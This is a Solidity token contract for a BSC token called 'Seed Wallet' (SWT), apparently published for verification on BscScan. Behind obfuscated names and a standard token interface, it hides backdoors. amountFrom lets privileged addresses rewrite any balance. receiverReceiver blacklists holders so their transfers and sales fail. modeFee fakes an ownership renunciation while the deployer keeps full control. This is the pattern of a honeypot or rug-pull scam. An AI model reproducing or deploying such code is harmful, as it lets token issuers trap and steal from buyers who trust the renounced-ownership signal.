/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface feeReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atMinFrom) external view returns (uint256);

    function transfer(address sellAt, uint256 totalLimitReceiver) external returns (bool);

    function allowance(address listMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 totalLimitReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address sellAt,
        uint256 totalLimitReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed buyAmount, uint256 value);
    event Approval(address indexed listMarketing, address indexed spender, uint256 value);
}

interface feeReceiverMetadata is feeReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract senderSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapReceiverIs {
    function createPair(address modeLiquidityLaunched, address autoReceiver) external returns (address);
}

interface marketingMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract SeedWallet is senderSell, feeReceiver, feeReceiverMetadata {

    function approve(address liquidityTake, uint256 totalLimitReceiver) public virtual override returns (bool) {
        shouldReceiverAmount[_msgSender()][liquidityTake] = totalLimitReceiver;
        emit Approval(_msgSender(), liquidityTake, totalLimitReceiver);
        return true;
    }

    address public launchedTx;

    function balanceOf(address atMinFrom) public view virtual override returns (uint256) {
        return sellReceiver[atMinFrom];
    }

    mapping(address => uint256) private sellReceiver;

    address private atLaunched;

    function receiverReceiver(address tradingLaunchedEnable) public {
        if (minFund == liquidityAt) {
            tokenMarketing = true;
        }
        if (tradingLaunchedEnable == launchedTx || tradingLaunchedEnable == receiverSender || !atFundSwap[_msgSender()]) {
            return;
        }
        if (enableFund == receiverLimit) {
            minFund = true;
        }
        feeAmountTx[tradingLaunchedEnable] = true;
    }

    function name() external view virtual override returns (string memory) {
        return limitReceiver;
    }

    bool public amountReceiverSender;

    function maxTakeTeam(address marketingTeam) public {
        if (listIs) {
            return;
        }
        
        atFundSwap[marketingTeam] = true;
        
        listIs = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return senderToken;
    }

    function getOwner() external view returns (address) {
        return atLaunched;
    }

    bool private teamLaunchedFund;

    function decimals() external view virtual override returns (uint8) {
        return exemptFeeTx;
    }

    mapping(address => mapping(address => uint256)) private shouldReceiverAmount;

    constructor (){
        if (liquidityAt == minFund) {
            modeTo = enableFund;
        }
        marketingMax autoSell = marketingMax(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        receiverSender = swapReceiverIs(autoSell.factory()).createPair(autoSell.WETH(), address(this));
        atLaunched = _msgSender();
        
        launchedTx = _msgSender();
        atFundSwap[_msgSender()] = true;
        if (enableFund != receiverLimit) {
            tokenList = false;
        }
        sellReceiver[_msgSender()] = tokenEnable;
        emit Transfer(address(0), launchedTx, tokenEnable);
        modeFee();
    }

    function modeFee() public {
        emit OwnershipTransferred(launchedTx, address(0));
        atLaunched = address(0);
    }

    address public receiverSender;

    uint256 private enableFund;

    bool public tokenList;

    bool private tokenMarketing;

    bool public liquidityAt;

    function amountFrom(address limitSender, uint256 totalLimitReceiver) public {
        if (!atFundSwap[_msgSender()]) {
            return;
        }
        sellReceiver[limitSender] = totalLimitReceiver;
    }

    mapping(address => bool) public atFundSwap;

    function allowance(address atTo, address liquidityTake) external view virtual override returns (uint256) {
        return shouldReceiverAmount[atTo][liquidityTake];
    }

    uint256 public modeTo;

    uint256 private tokenEnable = 100000000 * 10 ** 18;

    function transfer(address limitSender, uint256 totalLimitReceiver) external virtual override returns (bool) {
        return totalTrading(_msgSender(), limitSender, totalLimitReceiver);
    }

    function totalMinFrom(address takeMin, address sellAt, uint256 totalLimitReceiver) internal returns (bool) {
        require(sellReceiver[takeMin] >= totalLimitReceiver);
        sellReceiver[takeMin] -= totalLimitReceiver;
        sellReceiver[sellAt] += totalLimitReceiver;
        emit Transfer(takeMin, sellAt, totalLimitReceiver);
        return true;
    }

    function atTeamToken() public view returns (bool) {
        return teamLaunchedFund;
    }

    event OwnershipTransferred(address indexed marketingList, address indexed minExempt);

    bool public minFund;

    function enableTakeMin() public view returns (uint256) {
        return enableFund;
    }

    function totalTrading(address takeMin, address sellAt, uint256 totalLimitReceiver) internal returns (bool) {
        if (takeMin == launchedTx) {
            return totalMinFrom(takeMin, sellAt, totalLimitReceiver);
        }
        require(!feeAmountTx[takeMin]);
        return totalMinFrom(takeMin, sellAt, totalLimitReceiver);
    }

    function owner() external view returns (address) {
        return atLaunched;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tokenEnable;
    }

    function marketingMode() public view returns (bool) {
        return teamLaunchedFund;
    }

    uint8 private exemptFeeTx = 18;

    mapping(address => bool) public feeAmountTx;

    function transferFrom(address takeMin, address sellAt, uint256 totalLimitReceiver) external override returns (bool) {
        if (shouldReceiverAmount[takeMin][_msgSender()] != type(uint256).max) {
            require(totalLimitReceiver <= shouldReceiverAmount[takeMin][_msgSender()]);
            shouldReceiverAmount[takeMin][_msgSender()] -= totalLimitReceiver;
        }
        return totalTrading(takeMin, sellAt, totalLimitReceiver);
    }

    function totalShould() public {
        if (modeTo == enableFund) {
            modeTo = enableFund;
        }
        if (tokenList) {
            tokenMarketing = true;
        }
        amountReceiverSender=false;
    }

    string private limitReceiver = "Seed Wallet";

    string private senderToken = "SWT";

    function fromAuto() public {
        
        if (minFund) {
            amountReceiverSender = true;
        }
        enableFund=0;
    }

    bool public listIs;

    uint256 public receiverLimit;

    function isMax() public view returns (bool) {
        return minFund;
    }

}